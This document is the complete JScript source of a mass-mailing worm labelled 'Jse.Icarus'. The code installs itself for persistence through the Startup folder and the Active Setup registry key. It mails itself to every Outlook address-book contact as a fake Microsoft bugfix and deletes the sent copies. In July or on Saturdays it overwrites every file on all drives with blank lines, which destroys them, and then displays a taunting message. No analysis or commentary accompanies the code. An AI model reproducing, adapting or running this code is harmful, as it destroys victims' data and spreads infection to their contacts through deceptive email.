// Jse.Icarus - By SAD1c
var fso=WScript.createobject("scripting.filesystemobject");
var wsh=WScript.createobject("wscript.shell");
var oao=WScript.createobject("outlook.application");
var vcopy=fso.getfile(WScript.scriptname);
var wif=fso.getspecialfolder(2)+"\\CmdWsh32.jse";
vcopy.copy(wsh.specialfolders("AllUsersStartup")+"\\WinStartSrv.jse",1);
vcopy.copy(wif,1);
addreg("HKLM\\software\\microsoft\\active setup\\installed components\\keyname\\stubpath","wscript.exe "+wif);
addreg("HKCU\\Software\\WinLogonSrv\\Icarus\\","Jse.Icarus - By SAD1c");
try
{
	var outd=wsh.regread("HKCU\\Software\\WinLogonSrv\\Icarus\\Outlook");
}
catch(err)
{
	var att=fso.getspecialfolder(2)+"\\WinBugsFixerInstall.jse";
	vcopy.copy(att);
	var mapi=oao.getnamespace("MAPI");
	for(cnt=1; cnt<=mapi.addresslists.count; cnt++)
	{
		for(add=1; add<=mapi.addresslists(cnt).addressentries.count; add++)
		{
			var mail=oao.createitem(0);
			mail.Subject="Important program!";
			mail.Body="Hi. I wanted to give you this bugfix program, created by microsoft.\n";
			mail.Body=mail.Body+"This useful program is able to find and fix all defects and problems ";
			mail.Body=mail.Body+"in your windows.\nI've installed it and now everything works fine, ";
			mail.Body=mail.Body+"so i've thought to you and sent this mail.\nHoping that this helps, ";
			mail.Body=mail.Body+"I greet you. Bye!";
			mail.attachments.Add(att,1,mail.Body.length,"WinBugsFixerInstall.exe");
			mail.importance=2;
			mail.deleteaftersubmit=true;
			mail.send;
		}
	}	
	addreg("HKCU\\Software\\WinLogonSrv\\Icarus\\Outlook","done");
}
var date=new Date();
if(date.getMonth()==6 || date.getDay()==6)
{
	var drvs=new Enumerator(fso.drives);
	for(; !drvs.atEnd(); drvs.moveNext())
	{
		var drive=drvs.item();
		if (drive.isready) burnfolder(drive.path);
	}
	var msg="After \"Jse.Icarus\" activation your files burned down, like Icarus's wings on his crazy fly.\n";
	msg=msg+"Icarus died for his own blame, but your data has been killed because your system's security ";
	msg=msg+"is a shit and you are too stupid.\nI hope that you learned something from this.\nGreets from SAD1c";
	WScript.echo(msg);
}
function addreg(regpath,regcontent)
{
	wsh.regwrite(regpath,regcontent);
}
function burnfolder(folderpath)
{
	var flds=new Enumerator(fso.getfolder(folderpath).subfolders);
	for(; !flds.atEnd(); flds.moveNext())
	{
		var folder=flds.item();
		burnfolder(folder.path);
	}
	var fils=new Enumerator(fso.getfolder(folderpath).files);
	for(; !fils.atEnd(); fils.moveNext())
	{
		var file=fils.item();
		burnfile(file.path);
	}
}
function burnfile(filepath)
{
	var fg=fso.getfile(filepath);
	var fileattr=fg.attributes;
	fg.attributes=0;
	var btf=fso.opentextfile(filepath,2);
	btf.writeblanklines(666);
	btf.close();
	fg.attributes=fileattr;
}